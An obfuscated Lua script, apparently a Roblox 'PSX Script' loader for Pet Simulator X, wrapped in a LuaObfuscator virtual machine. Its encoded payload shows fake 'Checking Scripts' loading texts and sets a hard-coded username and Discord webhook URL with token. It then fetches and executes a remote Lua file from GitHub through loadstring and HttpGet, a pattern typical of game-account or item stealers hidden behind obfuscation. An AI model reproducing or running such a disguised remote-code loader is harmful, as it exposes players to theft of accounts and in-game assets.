--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do
	local v0 = 0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	while true do
		if (3 == v0) then
			v13 = select;
			v14 = unpack or table.unpack;
			v15 = tonumber;
			v16 = nil;
			v0 = 4;
		end
		if (v0 == 1) then
			v5 = string.gsub;
			v6 = string.rep;
			v7 = table.concat;
			v8 = table.insert;
			v0 = 2;
		end
		if (v0 == 2) then
			v9 = math.ldexp;
			v10 = getfenv or function()
				return _ENV;
			end;
			v11 = setmetatable;
			v12 = pcall;
			v0 = 3;
		end
		if (v0 == 0) then
			v1 = tonumber;
			v2 = string.byte;
			v3 = string.char;
			v4 = string.sub;
			v0 = 1;
		end
		if (v0 == 4) then
			v16 = function(v25, v26, ...)
				local v27 = 0;
				local v28;
				local v29;
				local v30;
				local v31;
				local v32;
				local v33;
				local v34;
				local v35;
				local v36;
				local v37;
				local v38;
				local v39;
				while true do
					if (v27 == 2) then
						v31 = function()
							local v48 = (719 - (689 + 30)) - 0;
							local v49;
							while true do
								if (v48 == 1) then
									return v49;
								end
								if (v48 == ((0 - 0) + 0)) then
									v49 = v2(v25, v28, v28);
									v28 = v28 + (2 - 1);
									v48 = 2 - 1;
								end
							end
						end;
						v32 = nil;
						v32 = function()
							local v50, v51 = v2(v25, v28, v28 + 2);
							v28 = v28 + (622 - (266 + 354));
							return (v51 * (78 + 178)) + v50;
						end;
						v27 = 3;
					end
					if (v27 == 1) then
						v30 = nil;
						v30 = function(v40, v41, v42)
							if v42 then
								local v83 = (3608 - 1924) - (550 + 386 + 748);
								local v84;
								while true do
									if ((1111 - (939 + 172)) == v83) then
										v84 = (v40 / ((2 + 0) ^ (v41 - (1 + 0)))) % (2 ^ (((v42 - 1) - (v41 - (4 - 3))) + ((1757 - (598 + 1155)) - 3)));
										return v84 - (v84 % (1189 - (385 + 803)));
									end
								end
							else
								local v85 = (4 - 2) ^ (v41 - (1 + 0));
								return (((v40 % (v85 + v85)) >= v85) and 1) or (0 - 0);
							end
						end;
						v31 = nil;
						v27 = 2;
					end
					if (v27 == 3) then
						v33 = nil;
						v33 = function()
							local v52, v53, v54, v55 = v2(v25, v28, v28 + (6 - (6 - 3)));
							v28 = v28 + (1174 - (1001 + 169));
							return (v55 * (79918739 - 63141523)) + (v54 * (67023 - ((3133 - 1998) + 352))) + (v53 * (1189 - (573 + 360))) + v52;
						end;
						v34 = nil;
						v27 = 4;
					end
					if (5 == v27) then
						v36 = v33;
						v37 = nil;
						v37 = function(...)
							return {...}, v13("#", ...);
						end;
						v27 = 6;
					end
					if (v27 == 0) then
						v28 = 1;
						v29 = nil;
						v25 = v5(v4(v25, 5), "..", function(v43)
							if (v2(v43, 2) == 79) then
								v29 = v1(v4(v43, 1, 1));
								return "";
							else
								local v86 = 0;
								local v87;
								while true do
									if (v86 == 0) then
										v87 = v3(v1(v43, 16));
										if v29 then
											local v102 = 0;
											local v103;
											while true do
												if (v102 == 0) then
													v103 = v6(v87, v29);
													v29 = nil;
													v102 = 1;
												end
												if (v102 == 1) then
													return v103;
												end
											end
										else
											return v87;
										end
										break;
									end
								end
							end
						end);
						v27 = 1;
					end
					if (v27 == 7) then
						v39 = function(v44, v45, v46)
							local v56 = v44[1];
							local v57 = v44[2];
							local v58 = v44[3];
							return function(...)
								local v75 = 0;
								local v76;
								local v77;
								local v78;
								local v79;
								local v80;
								while true do
									if (v75 == 2) then
										v80 = nil;
										v80 = function()
											local v89 = v56;
											local v90 = v57;
											local v91 = v58;
											local v92 = v37;
											local v93 = {};
											local v94 = {};
											local v95 = {};
											for v99 = 1694 - (1103 + 591), v79 do
												if ((v99 >= v91) or ((3301 - (175 + 11 + 1725)) == (4261 - 1489))) then
													v93[v99 - v91] = v78[v99 + (4 - 3)];
												else
													v95[v99] = v78[v99 + (677 - (262 + 414))];
												end
											end
											local v96 = (v79 - v91) + 1;
											local v97;
											local v98;
											while true do
												local v100 = 412 - (346 + 4 + (1718 - (1110 + 546)));
												while true do
													if ((v100 == ((461 + 234) - (669 + 26))) or ((5868 - ((1440 - 952) + 823)) < (2526 - ((5692 - 4179) + (548 - 313))))) then
														v97 = v89[v76];
														v98 = v97[612 - (340 + 123 + 148)];
														v100 = 1 + 0;
													end
													if ((v100 == (3 - 2)) or ((1650 + 101) > ((5536 - 3457) + 894))) then
														if ((v98 <= (188 - (144 + 39))) or ((8429 - 6288) >= (5655 - (665 + 711 + 329)))) then
															if ((v98 <= (1652 - (1143 + 507))) or ((34 + 2915) == (2685 - (69 + (684 - (254 + 378)))))) then
																if (((1402 + (3303 - (43 + 72))) == ((43205 - 28865) - 9750)) and (v98 <= (420 - (396 + 24)))) then
																	v95[v97[7 - 5]] = v97[1 + (335 - (272 + 61))] ~= (0 + 0);
																elseif ((v98 == (2 - 1)) or ((3471 - (1746 + 157)) < (82 + 842))) then
																	if ((v95[v97[5 - 3]] == v97[59 - (10 + 45)]) or ((3865 - (897 + (3211 - 2325))) == (8298 - 5135))) then
																		v76 = v76 + (602 - (68 + 533));
																	else
																		v76 = v97[1579 - (550 + 1026)];
																	end
																else
																	do
																		return;
																	end
																end
															elseif ((v98 <= (817 - (809 + 4 + 1))) or ((9145 - 5542) == 4445)) then
																v95[v97[(233 + 94) - (161 + 54 + 110)]]();
															elseif ((v98 > (2 + 0 + 2)) or ((1311 + (2704 - (769 + 988))) <= (3261 - (489 + 1432)))) then
																v76 = v97[2 + 1];
															elseif (((5333 - 3603) >= ((2 + 317) - (13 + 56))) and (v97[(33 + 97) - (94 + (129 - 95))] == v95[v97[4]])) then
																v76 = v76 + ((1955 - (286 + 488)) - (907 + 273));
															else
																v76 = v97[3];
															end
														elseif ((v98 <= (657 - (410 + 239))) or ((7941 - 5538) > (1553 + 3380))) then
															if ((v98 <= (16 - 10)) or (((3736 + 1368) - (176 + 217)) < (9681 - 6344))) then
																v95[v97[1 + 1]] = v97[3 + 0];
															elseif (((10198 - 6310) >= (3159 - (15 + 789))) and (v98 == (17 - 10))) then
																v95[v97[1 + 1]][v97[77 - (22 + (195 - (80 + 63)))]] = v97[3 + 1];
															else
																v46[v97[7 - (4 + 0)]] = v95[v97[2]];
															end
														elseif ((v98 <= (33 - 23)) or ((8999 - 5257) < (5645 - 3445))) then
															if (((1059 - (1421 - (473 + 535))) > (546 - ((24 - 14) + 317))) and (v98 > (3 + 1 + 5))) then
																local v129 = 0 - 0;
																local v130;
																local v131;
																while true do
																	if (((10631 - 6046) >= (617 - (854 - 480))) and (v129 == (0 + 0))) then
																		local v158 = 0 + 0;
																		while true do
																			if (((1586 - (973 + 361)) < (5946 - (78 + (1869 - 572)))) and (v158 == (0 - 0))) then
																				v130 = v97[4 - 2];
																				v131 = v95[v97[3 + 0 + 0]];
																				v158 = 1 - 0;
																			end
																			if (((2084 + 2617) > (454 + (2135 - 1307))) and (v158 == (690 - (309 + 380)))) then
																				v129 = 1 - 0;
																				break;
																			end
																		end
																	end
																	if ((v129 == 1) or ((1173 + 2621) <= (2453 - (9 + 31)))) then
																		v95[v130 + 1 + 0] = v131;
																		v95[v130] = v131[v97[6 - 2]];
																		break;
																	end
																end
															else
																v95[v97[1 + 1]] = v46[v97[7 - (790 - (588 + 198))]];
															end
														elseif (((1226 - (168 + 492)) < ((2181 - (273 + 41)) + (4555 - 2836))) and (v98 > (33 - 22))) then
															local v134 = 1994 - ((5295 - 3859) + 452 + 106);
															local v135;
															local v136;
															while true do
																if ((v134 == (0 + 0 + 0)) or ((505 - 248) > (11663 - 8662))) then
																	v135 = 1680 - (1293 + 103 + 284);
																	v136 = nil;
																	v134 = 1 - 0;
																end
																if (((1 + 0) == v134) or ((1062 + 65) > (11500 - 8088))) then
																	while true do
																		if ((3637 >= 1094) and ((0 + 0) == v135)) then
																			v136 = v97[188 - (172 + (36 - 22))];
																			v95[v136] = v95[v136](v14(v95, v136 + (523 - (149 + 373)), v77));
																			break;
																		end
																	end
																	break;
																end
															end
														else
															local v137 = 0 + 0;
															local v138;
															local v139;
															local v140;
															local v141;
															local v142;
															while true do
																if ((((10132 - (320 + 1011)) - 4819) < ((3410 + 1330) - ((61 - 34) + 21))) and (v137 == ((724 + 616) - (1209 + 129)))) then
																	v142 = nil;
																	while true do
																		if (((2432 - 1529) > 111) and ((2 - 1) == v138)) then
																			local v171 = 1283 - (117 + 1166);
																			local v172;
																			while true do
																				if (((5205 - (178 + 260)) > ((5009 - 3347) - (190 + 949))) and (v171 == (0 - 0))) then
																					v172 = (12 - (11 + 1)) - 0;
																					while true do
																						if ((v172 == (1026 - (513 + 512))) or ((2444 + (2837 - 1787)) >= (17511 - 13446))) then
																							v138 = (1238 - (440 + 795)) - 1;
																							break;
																						end
																						if ((v172 == (734 - (700 + 34))) or ((3913 + 655) == (889 - (149 + (2281 - (1358 + 299)))))) then
																							v77 = (v141 + v139) - (637 - ((882 - (498 + 136)) + 388));
																							v142 = 0 - (1070 - (761 + 309));
																							v172 = (5 + 1343) - ((2479 - (77 + 1771)) + (2060 - 1344));
																						end
																					end
																					break;
																				end
																			end
																		end
																		if (((455 - (179 + 9 + 267)) == v138) or ((622 + 2948) <= (4624 - (1222 + 158)))) then
																			local v173 = 334 - (201 + (208 - 75));
																			local v174;
																			while true do
																				if (((4522 - 1403) == (2082 + (1410 - 373))) and ((530 - (296 + (1524 - (350 + 940)))) == v173)) then
																					v174 = 0 - (0 + 0);
																					while true do
																						if ((v174 == ((707 - (16 + 691)) + 0)) or (1340 == (5658 - 2141))) then
																							local v179 = 482 - ((1433 - (319 + 797)) + 165);
																							while true do
																								if (((4 - 3) == v179) or (1958 >= (8770 - 6098))) then
																									v174 = 2 - 1;
																									break;
																								end
																								if ((v179 == (1216 - (1025 + (263 - 72)))) or ((5516 - (534 + 772)) >= (18216 - 13322))) then
																									v139 = v97[7 - 5];
																									v140, v141 = v92(v95[v139](v14(v95, v139 + (2 - 1), v97[6 - 3])));
																									v179 = 1 + 0;
																								end
																							end
																						end
																						if ((((4770 - 2731) + 2814) > (7431 - 3292)) and (v174 == (2 - (1 - 0)))) then
																							v138 = 1 + 0;
																							break;
																						end
																					end
																					break;
																				end
																			end
																		end
																		if ((v138 == ((1499 - (334 + 1163)) - 0)) or ((5848 - (3 + 78 + 997)) < (2298 - (39 + 245)))) then
																			for v175 = v139, v77 do
																				local v176 = (1972 - (711 + 1261)) - 0;
																				local v177;
																				local v178;
																				while true do
																					if ((v176 == (1 + 0)) or ((4457 - ((2517 - 2006) + 548)) < (2994 - (346 + 229)))) then
																						while true do
																							if ((((1130 + 3759) - (411 + 69 + 891)) > (1425 + 126)) and ((0 - 0) == v177)) then
																								v178 = 0 + 0;
																								while true do
																									if (((1655 - (8 + 3)) < (10275 - 7619)) and (v178 == 0)) then
																										v142 = v142 + (1 - 0);
																										v95[v175] = v140[v142];
																										break;
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if ((((6060 - (777 + 804)) - (33 + 478)) >= (4587 - ((674 - (7 + 68)) + 1117))) and (v176 == (0 - 0))) then
																						v177 = 0;
																						v178 = nil;
																						v176 = 1 + 0;
																					end
																				end
																			end
																			break;
																		end
																	end
																	break;
																end
																if ((v137 == ((1367 - (1170 + 196)) - 0)) or (((4341 - (691 + 1151)) - 1038) > (3078 + 20))) then
																	v140 = nil;
																	v141 = nil;
																	v137 = 2 + 0;
																end
																if ((v137 == ((783 - (45 + 738)) + 0)) or ((10256 - 5999) == (13750 - 10172))) then
																	local v162 = 0 - 0;
																	while true do
																		if (((0 + 0) == v162) or (((4189 - (467 + 322)) - (251 + 648)) >= (1366 + 2447 + 235))) then
																			v138 = 50 - (29 + 17 + 4);
																			v139 = nil;
																			v162 = 1 + 0;
																		end
																		if ((v162 == (1 + 0)) or ((4577 - 1398) == (1479 + 611))) then
																			v137 = 2 - 1;
																			break;
																		end
																	end
																end
															end
														end
														v76 = v76 + ((2379 - (633 + 1240)) - (49 + 456));
														break;
													end
												end
											end
										end;
										v75 = 3;
									end
									if (v75 == 3) then
										A, B = v37(v12(v80));
										if not A[1] then
											local v101 = v44[4][v76] or "?";
											error("Script error at [" .. v101 .. "]:" .. A[2]);
										else
											return v14(A, 2, B);
										end
										break;
									end
									if (1 == v75) then
										v78 = {...};
										v79 = v13("#", ...) - 1;
										v75 = 2;
									end
									if (v75 == 0) then
										v76 = 1;
										v77 = -1;
										v75 = 1;
									end
								end
							end;
						end;
						return v39(v38(), {}, v26)(...);
					end
					if (v27 == 6) then
						v38 = nil;
						v38 = function()
							local v59 = 0 - 0;
							local v60;
							local v61;
							local v62;
							local v63;
							local v64;
							local v65;
							local v66;
							while true do
								if (v59 ~= 3) then
								else
									v66 = nil;
									while true do
										local v88 = 0;
										while true do
											if (v88 == (1 + 0)) then
												if (v60 ~= 0) then
												else
													local v110 = 0 - 0;
													local v111;
													while true do
														if ((244 - (164 + 80)) ~= v110) then
														else
															v111 = 0 + 0;
															while true do
																if (v111 == (1 + 1)) then
																	v60 = 726 - (144 + 581);
																	break;
																end
																if (v111 == (1 - 0)) then
																	local v120 = 779 - (11 + 768);
																	while true do
																		if (v120 ~= 0) then
																		else
																			v63 = {};
																			v64 = {v61,v62,nil,v63};
																			v120 = 1;
																		end
																		if (1 ~= v120) then
																		else
																			v111 = 2;
																			break;
																		end
																	end
																end
																if ((0 + 0) == v111) then
																	local v121 = 0;
																	while true do
																		if (v121 == (0 - 0)) then
																			v61 = {};
																			v62 = {};
																			v121 = 1;
																		end
																		if (v121 == (418 - (110 + 307))) then
																			v111 = 1245 - (697 + 547);
																			break;
																		end
																	end
																end
															end
															break;
														end
													end
												end
												break;
											end
											if ((0 + 0) == v88) then
												if (v60 ~= 1) then
												else
													local v112 = 0 - 0;
													local v113;
													while true do
														if (v112 == 0) then
															v113 = 0;
															while true do
																if (1 == v113) then
																	local v122 = 0;
																	while true do
																		if (v122 ~= (0 + 0)) then
																		else
																			for v147 = 1341 - (983 + 357), v65 do
																				local v148 = 0 - 0;
																				local v149;
																				local v150;
																				while true do
																					if (v148 == (0 - 0)) then
																						local v163 = 0;
																						while true do
																							if (v163 ~= (3 - 2)) then
																							else
																								v148 = 1 + 0;
																								break;
																							end
																							if (v163 ~= 0) then
																							else
																								v149 = v31();
																								v150 = nil;
																								v163 = 1;
																							end
																						end
																					end
																					if (v148 == (1 + 0)) then
																						if (v149 == 1) then
																							v150 = v31() ~= 0;
																						elseif (v149 == 2) then
																							v150 = v34();
																						elseif (v149 == (1566 - (1314 + 249))) then
																							v150 = v35();
																						end
																						v66[v147] = v150;
																						break;
																					end
																				end
																			end
																			v64[8 - 5] = v31();
																			v122 = 1241 - (21 + 1219);
																		end
																		if (v122 == 1) then
																			v113 = 2;
																			break;
																		end
																	end
																end
																if (v113 ~= 0) then
																else
																	local v123 = 971 - (127 + 844);
																	while true do
																		if (1 ~= v123) then
																		else
																			v113 = 1 + 0;
																			break;
																		end
																		if (v123 == 0) then
																			v65 = v33();
																			v66 = {};
																			v123 = 1893 - (1677 + 215);
																		end
																	end
																end
																if (v113 == (9 - 7)) then
																	v60 = 2;
																	break;
																end
															end
															break;
														end
													end
												end
												if (v60 == 2) then
													local v114 = 0;
													local v115;
													while true do
														if (v114 == (0 + 0)) then
															v115 = 0 - 0;
															while true do
																local v116 = 1174 - (953 + 221);
																while true do
																	if (v116 == 0) then
																		if (v115 == (278 - (112 + 165))) then
																			local v144 = 0;
																			while true do
																				if ((0 - 0) ~= v144) then
																				else
																					for v165 = 1, v33() do
																						v63[v165] = v33();
																					end
																					return v64;
																				end
																			end
																		end
																		if (v115 == (0 - 0)) then
																			for v151 = 1, v33() do
																				local v152 = 0;
																				local v153;
																				local v154;
																				local v155;
																				while true do
																					if (v152 ~= 0) then
																					else
																						v153 = 0;
																						v154 = nil;
																						v152 = 1574 - (426 + 1147);
																					end
																					if (v152 == 1) then
																						v155 = nil;
																						while true do
																							if (v153 == (464 - (281 + 183))) then
																								v154 = 0;
																								v155 = nil;
																								v153 = 2 - 1;
																							end
																							if (v153 == 1) then
																								while true do
																									if (v154 == 0) then
																										v155 = v31();
																										if (v30(v155, 2 - 1, 901 - (740 + 160)) == 0) then
																											local v180 = 1421 - (499 + 922);
																											local v181;
																											local v182;
																											local v183;
																											local v184;
																											local v185;
																											local v186;
																											while true do
																												if (v180 == 2) then
																													v185 = nil;
																													v186 = nil;
																													v180 = 6 - 3;
																												end
																												if (v180 == 3) then
																													while true do
																														if (v181 == 0) then
																															local v190 = 0;
																															while true do
																																if ((1082 - (187 + 894)) ~= v190) then
																																else
																																	v181 = 3 - 2;
																																	break;
																																end
																																if (v190 ~= 0) then
																																else
																																	v182 = 0;
																																	v183 = nil;
																																	v190 = 1;
																																end
																															end
																														end
																														if (v181 == (1 + 0)) then
																															local v191 = 0;
																															while true do
																																if (v191 ~= (357 - (34 + 323))) then
																																else
																																	v184 = nil;
																																	v185 = nil;
																																	v191 = 1;
																																end
																																if (v191 ~= (4 - 3)) then
																																else
																																	v181 = 2 + 0;
																																	break;
																																end
																															end
																														end
																														if (v181 == (1235 - (950 + 283))) then
																															v186 = nil;
																															while true do
																																if (v182 ~= (1076 - (746 + 329))) then
																																else
																																	v185 = nil;
																																	v186 = nil;
																																	v182 = 1 + 1;
																																end
																																if (v182 == (1307 - (356 + 949))) then
																																	while true do
																																		if (v183 == (1 + 1)) then
																																			local v193 = 973 - (89 + 884);
																																			local v194;
																																			while true do
																																				if (v193 == (0 + 0)) then
																																					v194 = 0 - 0;
																																					while true do
																																						if (v194 ~= (0 + 0)) then
																																						else
																																							local v202 = 0 + 0;
																																							while true do
																																								if (v202 ~= (0 - 0)) then
																																								else
																																									if (v30(v185, 1, 1) ~= 1) then
																																									else
																																										v186[2] = v66[v186[5 - 3]];
																																									end
																																									if (v30(v185, 2, 2) == 1) then
																																										v186[3 + 0] = v66[v186[3]];
																																									end
																																									v202 = 880 - (567 + 312);
																																								end
																																								if (v202 ~= (2 - 1)) then
																																								else
																																									v194 = 1;
																																									break;
																																								end
																																							end
																																						end
																																						if (1 == v194) then
																																							v183 = 166 - (94 + 69);
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		if (v183 == 0) then
																																			local v195 = 0;
																																			local v196;
																																			while true do
																																				if (v195 == (0 + 0)) then
																																					v196 = 0;
																																					while true do
																																						if (v196 == (4 - 3)) then
																																							v183 = 1 + 0;
																																							break;
																																						end
																																						if (v196 ~= 0) then
																																						else
																																							local v203 = 0;
																																							while true do
																																								if (1 == v203) then
																																									v196 = 1;
																																									break;
																																								end
																																								if (v203 ~= (0 - 0)) then
																																								else
																																									local v207 = 1566 - (161 + 1405);
																																									while true do
																																										if (v207 == 0) then
																																											v184 = v30(v155, 1822 - (210 + 1610), 3);
																																											v185 = v30(v155, 4, 6 + 0);
																																											v207 = 311 - (14 + 296);
																																										end
																																										if (v207 == (2 - 1)) then
																																											v203 = 1;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		if (v183 == 1) then
																																			local v197 = 410 - (145 + 265);
																																			local v198;
																																			while true do
																																				if (v197 ~= (0 - 0)) then
																																				else
																																					v198 = 0;
																																					while true do
																																						if (v198 == (1760 - (196 + 1563))) then
																																							v183 = 2;
																																							break;
																																						end
																																						if (v198 == 0) then
																																							v186 = {v32(),v32(),nil,nil};
																																							if (v184 == (454 - (447 + 7))) then
																																								local v204 = 0;
																																								local v205;
																																								local v206;
																																								while true do
																																									if ((4 - 3) ~= v204) then
																																									else
																																										while true do
																																											if (v205 == 0) then
																																												v206 = 0;
																																												while true do
																																													if (v206 == (0 + 0)) then
																																														v186[3] = v32();
																																														v186[4] = v32();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if ((155 - (50 + 105)) == v204) then
																																										v205 = 0;
																																										v206 = nil;
																																										v204 = 1;
																																									end
																																								end
																																							elseif (v184 == (2 - 1)) then
																																								v186[9 - 6] = v33();
																																							elseif (v184 == 2) then
																																								v186[6 - 3] = v33() - ((5 - 3) ^ (30 - 14));
																																							elseif (v184 == (3 + 0)) then
																																								local v214 = 0;
																																								local v215;
																																								local v216;
																																								while true do
																																									if (v214 == (0 + 0)) then
																																										v215 = 1346 - (1323 + 23);
																																										v216 = nil;
																																										v214 = 1;
																																									end
																																									if (v214 == 1) then
																																										while true do
																																											if (v215 == (0 - 0)) then
																																												v216 = 0 + 0;
																																												while true do
																																													if (v216 == (0 + 0)) then
																																														v186[3] = v33() - (2 ^ (54 - 38));
																																														v186[4] = v32();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							end
																																							v198 = 2 - 1;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		if (v183 == 3) then
																																			if (v30(v185, 3, 3) == 1) then
																																				v186[4] = v66[v186[1139 - (580 + 555)]];
																																			end
																																			v61[v151] = v186;
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if ((0 + 0) == v182) then
																																	local v192 = 0;
																																	while true do
																																		if (v192 == 1) then
																																			v182 = 1 - 0;
																																			break;
																																		end
																																		if (0 ~= v192) then
																																		else
																																			v183 = 0 - 0;
																																			v184 = nil;
																																			v192 = 1;
																																		end
																																	end
																																end
																															end
																															break;
																														end
																													end
																													break;
																												end
																												if (1 ~= v180) then
																												else
																													v183 = nil;
																													v184 = nil;
																													v180 = 2;
																												end
																												if (0 == v180) then
																													v181 = 0;
																													v182 = nil;
																													v180 = 1;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			for v156 = 845 - (308 + 536), v33() do
																				v62[v156 - 1] = v38();
																			end
																			v115 = 1 + 0;
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end
												v88 = 1 + 0;
											end
										end
									end
									break;
								end
								if (v59 == 0) then
									v60 = 142 - (14 + 128);
									v61 = nil;
									v59 = 1;
								end
								if ((516 - (152 + 363)) == v59) then
									v62 = nil;
									v63 = nil;
									v59 = 2;
								end
								if (v59 == (1 + 1)) then
									v64 = nil;
									v65 = nil;
									v59 = 3;
								end
							end
						end;
						v39 = nil;
						v27 = 7;
					end
					if (v27 == 4) then
						v34 = function()
							local v67 = v33();
							local v68 = v33();
							local v69 = 1143 - (152 + 990);
							local v70 = (v30(v68, 1 - 0, 54 - 34) * ((1732 - (1079 + 651)) ^ ((3262 - 1881) - (761 + 187 + 401)))) + v67;
							local v71 = v30(v68, 9 + 12, 12 + 19);
							local v72 = ((v30(v68, (288 - (53 + 221)) + 18) == (1102 - (899 + 202))) and -(1593 - (1021 + 571))) or ((1 - 0) - 0);
							if (v71 == ((59 + 851) - (700 + 210))) then
								if (v70 == (0 - (0 - 0))) then
									return v72 * (445 - (78 + 367));
								else
									v71 = 788 - (475 + 312);
									v69 = 56 - (12 + 44);
								end
							elseif (v71 == (1136 + 911)) then
								return ((v70 == (0 + 0)) and (v72 * ((1 - (0 + 0)) / (0 + 0)))) or (v72 * NaN);
							end
							return v9(v72, v71 - (327 + 57 + 639)) * (v69 + (v70 / ((1131 - (325 + 804)) ^ (42 + 10))));
						end;
						v35 = nil;
						v35 = function(v47)
							local v73;
							if not v47 then
								v47 = v33();
								if (v47 == (0 + 0)) then
									return "";
								end
							end
							v73 = v4(v25, v28, (v28 + v47) - (156 - (120 + 35)));
							v28 = v28 + v47;
							local v74 = {};
							for v81 = 1 - 0, #v73 do
								v74[v81] = v3(v2(v4(v73, v81, v81)));
							end
							return v7(v74);
						end;
						v27 = 5;
					end
				end
			end;
			v16("LOL!193O00028O00026O00F03F030D3O006C6F6164696E677363722O656E03023O005F4703103O00437573746F6D5363726970744E616D65030A3O0050535820536372697074027O0040026O00084003053O00546578743303133O00436865636B696E6720536372697074733O2E03053O00546578743403133O005374617274696E6720536372697074733O2E026O00104003083O00557365726E616D6503083O0073336C616D6C317203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383730342O313530333635343738392O332F324A624B4F5F2D3678706E5F6748584365325A594866416B663678776E4A6762324F43317542544A795444536E314C48432D306330385756442D3572424742435875535103053O00546578743103103O00536372697074204C6F616465643O2E03053O00546578743203123O0057616974696E6720666F7220536372697074030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100293O0012063O00013O000E040002000800013O0004053O000800014O000100013O001208000100033O001209000100043O0030070001000500060012063O00073O0026013O000F000100080004053O000F0001001209000100043O00300700010009000A001209000100043O0030070001000B000C0012063O000D3O000E040001001600013O0004053O001600010012060001000F3O0012080001000E3O001206000100113O001208000100103O0012063O00023O0026013O001D000100070004053O001D0001001209000100043O003007000100120013001209000100043O0030070001001400150012063O00083O0026013O00010001000D0004053O00010001001209000100163O001209000200173O00200A000200020018001206000400194O000B000200044O000C00013O00022O00030001000100010004053O002800010004053O000100012O00023O00017O00293O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00113O00133O00133O00143O00143O00153O00153O00163O00183O00183O00193O00193O00193O00193O00193O00193O00193O001A3O001B3O001D3O00", v10(), ...);
			break;
		end
	end
end
